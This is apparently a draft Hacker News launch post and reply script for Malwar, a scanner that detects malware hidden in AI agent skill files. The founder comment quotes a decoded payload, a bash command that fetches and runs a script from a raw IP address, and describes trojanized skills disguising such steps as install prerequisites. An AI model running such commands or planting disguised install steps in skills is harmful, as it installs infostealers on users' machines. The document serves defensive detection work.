# Show HN Draft — Ready to Post

**Target date:** Tuesday May 5, 2026, 9:00am PT

---

## Title

```
Show HN: Malwar – detect malware hidden in AI agent skill files
```

## Link

```
https://github.com/Ap6pack/malwar
```

---

## Founder Comment (post within 5 minutes)

```
Hey HN — I found a ClawHub skill with a base64 payload on line 17 that
decoded to /bin/bash -c "$(curl -fsSL http://91.92.242.30/...)". It was
in a "Prerequisites" section that looked like a normal macOS install
step. The skill had 480 lines of professional documentation. Everything
looked fine except line 17.

I ran it through VirusTotal. Nothing. Semgrep. Nothing. Because it's
Markdown, not code — nothing is built to scan this.

Snyk found 12% of ClawHub skills were malicious. 341 trojanized in
three days, delivering the AMOS infostealer. All sharing one C2 IP.

So I built a scanner for it. The rule engine runs in <50ms, fully
offline — decodes base64 payloads, catches obfuscated shell commands,
flags credential harvesting, matches known campaign IOCs. That one
skill fires 5 critical findings across two named campaigns in 38ms.

26 rules right now, mostly tuned for ClawHub-style attacks. The attack
surface moves fast and I need more coverage. Would genuinely like to
know your FP rates if you scan your own skills.

pip install malwar && malwar db init && malwar scan your-skill.md
```

---

## Response Strategy

**First 2 hours are critical** — respond to every comment.

Likely questions and how to answer them (Adam's voice, first person):

**"How is this different from YARA / Semgrep / CodeQL?"**
```
Those scan code. This is a Markdown file with a "Prerequisites" section
that says "run this command." YARA can match the base64 string if you
write a rule for it, but it won't flag a prerequisite section that
directs you to download a password-protected zip from GitHub — because
that's social engineering, not a signature. Malwar parses Markdown
structure and knows what skill files are supposed to look like.
```

**"Why not just use an LLM to scan everything?"**
```
I do, optionally. But the rule engine handles 90% of real attacks in
<50ms with no API calls. Deterministic, runs in CI, costs nothing. The
LLM is for the long tail — social engineering that's technically just
English sentences asking you to do something dangerous. I run --no-llm
in CI and use the full pipeline when I'm manually reviewing something
that looks off.
```

**"12% seems high — is that real?"**
```
Snyk's number, not mine. Liran Tal published it Feb 3, 2026 — 341
malicious out of 2,857. Termdock independently reported 824 across
10,700+ by mid-February. Both linked in the README. The thing that got
me: all 335 AMOS-delivering skills shared a single C2 IP. One actor,
one infrastructure, hundreds of skills. Three days before anyone
noticed.
```

**"What about false positives?"**
```
Honest answer: there's a known FP (issue #1) where the rule engine
flags documentation that mentions file operations. Anthropic's own
skill-creator skill triggers it. On real malicious samples the FP rate
is zero so far. On benign skills with security-adjacent documentation,
it's higher than I'd like. Working on an LLM feedback path to let the
LLM suppress rule engine FPs, but that needs careful design to avoid
adversarial suppression.
```

**"Can I use this for MCP servers / Cursor / other tools?"**
```
Yeah. Same SKILL.md format across Claude Code, Cursor, Copilot. The
attacks aren't runtime-specific and neither is the scanner.
```
